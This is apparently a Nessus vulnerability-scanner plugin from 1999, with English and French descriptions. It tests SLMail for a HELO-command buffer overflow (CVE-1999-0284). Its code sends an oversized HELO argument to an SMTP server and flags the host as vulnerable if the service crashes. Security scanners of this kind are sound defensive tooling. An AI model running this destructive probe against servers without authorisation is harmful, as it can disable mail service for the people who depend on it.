#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10256);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-1999-0284");
 
 name["english"] = "SLMail MTA 'HELO' denial";
 name["francais"] = "Déni de service 'HELO' contre le MTA SLMail";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
There might be a buffer overflow when this MTA is issued the 'HELO' command
issued by a too long argument. 

This problem may allow an attacker to execute arbitrary code on this computer,
or to disable your ability to send or receive emails.

Solution : contact your vendor for a patch.
Risk factor : High";


 desc["francais"] = "Il y a un dépassement
de buffer lorsque ce MTA recoit la commande
HELO suivie d'un argument trop long. 

Ce problème peut permettre à un pirate
d'executer du code arbitraire sur
votre machine, ou peut vous empecher
d'envoyer et de recevoir des messages.

Solution : contactez votre vendeur pour
un patch.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Overflows the remote SMTP server";
 summary["francais"] = "Overflow le serveur SMTP distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped", "SMTP/postfix");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  s = smtp_recv_banner(socket:soc);
  if(!s)exit(0);
  if(!egrep(pattern:"^220 .*", string:s))
  {
   close(soc);
   exit(0);
  }
  
  
  c = string("HELO ", crap(1999), "\r\n");
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if(!s)
  {
   close(soc);
   soc = open_sock_tcp(port);
   if(soc) s = smtp_recv_banner(socket:soc);
   else s = NULL;
   if(!s)
   {
    set_kb_item(name:string("SMTP/", port, "/helo_overflow"), value:TRUE);
    security_hole(port);
   }
  }
  close(soc);
 }
}
